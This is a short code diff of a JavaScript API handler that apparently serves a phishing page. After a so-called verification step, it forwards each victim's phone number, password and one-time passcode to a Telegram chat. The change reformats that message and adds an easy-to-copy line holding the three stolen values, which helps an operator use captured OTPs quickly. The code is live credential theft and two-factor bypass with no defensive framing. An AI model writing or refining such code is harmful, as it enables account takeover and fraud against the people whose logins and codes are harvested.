@@ -25,15 +25,19 @@ export default async function handler(req, res) {
     return res.status(400).json({ success: false, error: result.error });
   }
 
-  await sendToTelegram(`
-✅ تحقق ناجح
+  const time = new Date().toLocaleString('ar-MR');
+  const copyText = `📱 ${phone}\n🔐 ${entryCode}\n🔢 ${otpCode}`;
+
+  await sendToTelegram(
+    `✅ تحقق ناجح
 ━━━━━━━━━━━━━━
 📱 رقم الهاتف: ${phone}
 🔐 كلمة السر: ${entryCode}
 🔢 رمز OTP: ${otpCode}
-⏰ الوقت: ${new Date().toLocaleString('ar-MR')}
-━━━━━━━━━━━━━━
-  `);
+⏰ الوقت: ${time}
+━━━━━━━━━━━━━━`,
+    copyText
+  );
 
   return res.status(200).json({ success: true });
 }
